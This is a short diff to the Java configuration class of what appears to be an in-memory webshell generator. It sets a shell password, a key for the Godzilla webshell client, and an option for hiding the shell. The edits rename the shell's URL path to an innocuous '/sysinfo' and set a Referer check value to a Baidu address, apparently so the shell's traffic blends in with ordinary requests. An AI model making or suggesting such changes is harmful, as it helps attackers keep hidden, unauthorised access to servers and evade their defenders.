@@ -131,7 +131,7 @@ public class Config {
     public static Boolean IS_OBSCURE = false;
 
     // 各种方式的内存马映射的路径
-    public static String URL_PATTERN = "/qi4l";
+    public static String URL_PATTERN = "/sysinfo";
 
     // 是否使用落地文件的方式隐藏内存马
     public static Boolean HIDE_MEMORY_SHELL = false;
@@ -149,10 +149,10 @@ public class Config {
     public static String PASSWORD = "0f359740bd1cda99";
 
     // Referer 校验
-    public static String HEADER_KEY = "https://QI4L.cn/";
+    public static String HEADER_KEY = "Referer";
 
     // 用于额外校验的 Http Header 值，默认值 https://QI4L.cn/
-    public static String HEADER_VALUE = "https://QI4L.cn/";
+    public static String HEADER_VALUE = "https://www.baidu.cn/";
 
     // 哥斯拉的 key，默认是 key
     public static String GODZILLA_KEY = "3c6e0b8a9c15224a";
